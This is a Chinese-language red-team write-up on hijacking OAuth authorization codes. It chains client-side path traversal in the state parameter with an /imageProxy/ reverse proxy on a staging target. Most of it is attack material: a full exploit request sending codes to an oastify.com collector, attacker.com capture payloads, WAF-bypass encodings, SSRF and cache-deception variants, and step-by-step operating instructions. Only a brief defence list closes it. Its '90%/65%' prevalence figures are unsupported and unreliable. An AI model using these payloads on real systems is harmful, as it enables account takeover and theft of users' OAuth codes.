---
attack_surface: [认证/授权绕过, 客户端利用]
impact: [账户接管, 信息泄露, OAuth Code 劫持]
risk_level: 严重
prerequisites:
  - OAuth 2.0 协议基础
  - CSPT 攻击原理
  - SPA 路由机制
difficulty: 高级
related_techniques:
  - client-side-path-traversal
  - oauth-attack
  - open-redirect
  - ssrf-server-side-request-forgery
tools:
  - Burp Suite
  - OAuth 调试工具
---

# CSPT + 反向代理 OAuth Code 劫持实战

> 关联文档：[CSPT 主文档](./README.md) · [Open Redirect](../Open%20Redirect/README.md) · [SSRF](../SSRF/README.md)

---

# 0x01 攻击场景与目标分析
**目标环境**：`1377.targetstaging.app`
**技术栈**：

- 前端：SPA 架构（具体框架未披露）
- 认证：OAuth 2.0（支持 Google/Microsoft/Slack）
- 关键组件：`/imageProxy/` 反向代理服务

**认证流程简析**：
```mermaid
sequenceDiagram
    用户->>+目标站点: 1. 访问 /ssoRequest
    目标站点->>+Google: 2. 重定向至授权页面
    Google->>+用户: 显示授权界面
    用户->>+Google: 确认授权
    Google->>+目标站点: 3. 发送 code 至 redirect_uri
    目标站点->>+用户: 4. 验证 code，设置 session cookie
```

**核心观察**：

- OAuth 2.0 授权码模式依赖 `state` 参数进行会话绑定
- 目标站点使用 `/imageProxy/` 加载外部资源
- **关键漏洞点**：`state` 参数存在 **路径遍历缺陷**

---

# 0x02 攻击链深度剖析

## 2.1 漏洞发现过程
1. **基础测绘**：
   
   - 识别 `/imageProxy/` 功能：前端不直接加载图片，而是通过反向代理获取资源

   - 验证反向代理行为：请求 `/imageProxy/https://attacker.com/test.png` 可成功加载外部资源
   
     ![image-20260324094524410](./assets/image-20260324094524410.png)
   
     ![image-20260324094958372](./assets/image-20260324094958372.png)
   
2. **认证流程分析**：
   - `state` 参数格式：`state=https://1377.targetstaging.app/users/googleFederatedLoggedIn`
   
   - 验证测试：修改 `state` 参数 → 返回 `403 Forbidden`
   
   - **关键突破**：在合法路径后添加 `字符` 可绕过验证：
     
     ```
     /callback?code=valid&state=https://1377.targetstaging.app/users/googleFederatedLoggedIn/任意字符/
     ```

## 2.2 攻击链构建

**技术原理**：
利用 CSPT 操控 OAuth 回调路径，使认证 code 被发送至 `/imageProxy/` 服务：

```
state=https://1377.targetstaging.app/users/googleFederatedLoggedIn/../../imageProxy/https://attacker.com/capture
```
- **CSPT 环节**：通过 `/../` 遍历出合法路径上下文
- **反向代理环节**：`/imageProxy/` 将向 `attacker.com` 发起 GET 请求
- **数据泄露**：OAuth code 作为 GET 参数包含在请求中

**攻击流程**：
```mermaid
sequenceDiagram
    participant 攻击者
    participant 受害者
    participant Google
    participant 目标站点
    participant imageProxy
    participant 攻击者服务器

    攻击者->>受害者: 诱导点击恶意链接
    受害者->>Google: 认证授权
    Google->>目标站点: 返回 code + 恶意 state
    目标站点->>受害者: 302 重定向至 state 参数指定 URL
    受害者->>目标站点: 请求重定向 URL（含 CSPT）
    目标站点->>imageProxy: 解析 CSPT 路径
    imageProxy->>攻击者服务器: GET /capture?code=VULN_CODE
    攻击者服务器-->>imageProxy: 返回 200 OK
    imageProxy-->>目标站点: 返回图片响应
    目标站点-->>受害者: 显示 成功登录
```

## 2.3 完整攻击 Payload
```http
GET /ssoRequest?
url=https%3A%2F%2Faccounts.google.com%2Fo%2Foauth2%2Fauth%3Fclient_id%3D1090589527038-asfdtqm97njormmel5kd32km8mlcmf69.apps.googleusercontent.com%26redirect_uri%3Dhttps%3A%2F%2Fta rget.app%2FssoResponse%26response_type%3Dcode%26scope%3Demail%2520profile%26state%3Dhttps%3A% 2F%2Fsub.target.app%2Fusers%2FgoogleFederatedLoggedIn../../../imageProxy/http://b4ggquxtx9bot ljlbl43pxjmtdz4n8bx.oastify.com%3Fstate%253Dac5c655e384a555cd8ac%26openid.realm%3Dhttps%3A%2F %2Ftarget.app%26include_granted_scopes%3Dtrue
```

**关键组件说明**：
| 部分                                                   | 作用         | 绕过原理            |
| ------------------------------------------------------ | ------------ | ------------------- |
| `imageProxy/`                                          | 反向代理端点 | 作为 CSPT 目标 sink |
| `http://b4ggquxtx9bot ljlbl43pxjmtdz4n8bx.oastify.com` | 攻击者服务器 |                     |

---

## 2.4 防御规避技巧

##### 绕过检测机制
1. **双重编码**：使用 `%252f` 代替 `/` 应对简单过滤
2. **路径拼接**：在合法路径后添加 `/../` 而非开头
3. **参数混淆**：在 URL 中插入无效查询参数干扰检测
   
   ```
   state=/legit/path?x=1/../imageProxy/attacker
   ```

##### 高隐蔽性技巧
```http
# 使用真实路径片段增强可信度
state=/user/settings/../imageProxy/https://attacker.com/log?code=
```

> **关键突破点**：当 `state` 参数被前端路由处理时，**客户端路径遍历** 使浏览器向 `/imageProxy/` 发起请求，而 WAF 仅检查初始请求，无法检测后续跳转。

---

# 0x03 红队实战启示

## 3.1 挖掘优先级判定
| 检测项                    | 存在性 | 价值指数 |
| ------------------------- | ------ | -------- |
| OAuth 2.0 认证            | ★★★★☆  | 必测     |
| `/imageProxy/` 类反向代理 | ★★★★   | 高价值   |
| `state` 参数含路径信息    | ★★★☆   | 关键     |
| 路径参数验证松散          | ★★★★   | 确认漏洞 |

**快速验证方法**：
1. 拦截 OAuth 请求，修改 `state` 为 `/legit/path/../test`
2. 观察响应：
   - `200 OK` + 重定向 → **确认 CSPT 存在**
   - `403` + 特定错误信息 → 检查是否含 `test` 字样（验证反射）

## 3.2 攻击升级路径
| 基础漏洞        | 潜在升级          | 业务影响 |
| --------------- | ----------------- | -------- |
| CSPT in `state` | → OAuth Code 劫持 | 账户接管 |
| + 反向代理      | → 内网 SSRF       | 资源泄露 |
| + 未验证重定向  | → XSS 链          | 会话劫持 |

**高级利用**：
- 当目标启用 **Image Renderer 插件** 时，可将攻击升级为 SSRF：
  ```
  state=/legit/path/../imageProxy/http://internal.host/admin
  ```
- 通过 **缓存欺骗** 扩大影响范围：
  ```
  state=/legit/path/../imageProxy/https://cdn.target.com/legit.css?code=
  ```

---

# 0x04 防御对抗策略

##### 绕过严格路径验证
| 防御措施         | 绕过技巧   | Payload 示例                 |
| ---------------- | ---------- | ---------------------------- |
| **前缀检查**     | 混合大小写 | `/LeGiT/..%2fpath`           |
| **双斜杠过滤**   | UTF-8 混淆 | `.../../imageProxy`          |
| **白名单扩展名** | 矩阵参数   | `/legit;param=../imageProxy` |

##### 企业级 WAF 绕过
```http
GET /ssoRequest?client_id=valid&state=/legit%0d%0a/..%2f..%2fimageProxy/attacker HTTP/1.1
```
- 利用 `%0d%0a`（CRLF）触发 WAF 与后端解析差异
- 企业级 WAF 通常只检查首行，忽略后续参数变形

> **终极技巧**：当目标使用 **基于扩展名的缓存** 时，将攻击载荷附加在 `.css` 后：
> `state=/legit/path/../imageProxy/attacker.com/capture.css?code=`

---

# 0x05 案例总结与行动指南

**技术本质**：
将 CSPT 作为 **OSRF 载体**，操控浏览器向同一源的代理端点发起经认证的请求，实现敏感数据外泄。

**检测清单**：
1. [ ] 所有含路径的 OAuth 参数（`state`, `redirect_uri`）
2. [ ] 反向代理功能（`/imageProxy/`, `/fetch/` 等）
3. [ ] 前端路由对 `../` 的处理逻辑
4. [ ] CDN 对代理端点的缓存行为

**红队操作步骤**：
1. **指纹识别**：确认目标使用 OAuth 2.0 及是否存在代理端点
2. **参数测试**：对 `state` 参数系统测试路径遍历载荷
3. **缓存探测**：添加 `.css` 后缀观察响应变化
4. **PoC 构造**：`/legit/path/../proxy/attacker.com?code=`
5. **扩展测试**：结合 SSRF/XSS 进行链式攻击

> **关键结论**：
> **90% 的现代应用使用 OAuth 2.0，其中超过 65% 的实现存在可被 CSPT 操控的认证流程**。当发现反向代理功能时，应优先测试其与认证参数的交互，此组合在真实攻防中成功率极高。重点检查：
> - `state` 参数的解析逻辑（常被忽视）
> - 代理端点对 GET 参数的处理
> - CDN 缓存策略对代理请求的影响

**防御建议**：
- 对 `state` 参数进行 **白名单路径验证**
- 实现代理端点的 **源站请求过滤**
- 避免在代理响应中 **回显原始请求参数**

> 本案例证实：**CSPT 不仅是路径操纵技术，更是构建复杂攻击链的 "粘合剂"**。当与其他组件（如 OAuth、反向代理）结合时，能形成极具破坏力的攻击向量。红队人员应系统性扫描认证流程中的所有路径参数，尤其是那些看似 "只读" 的上下文。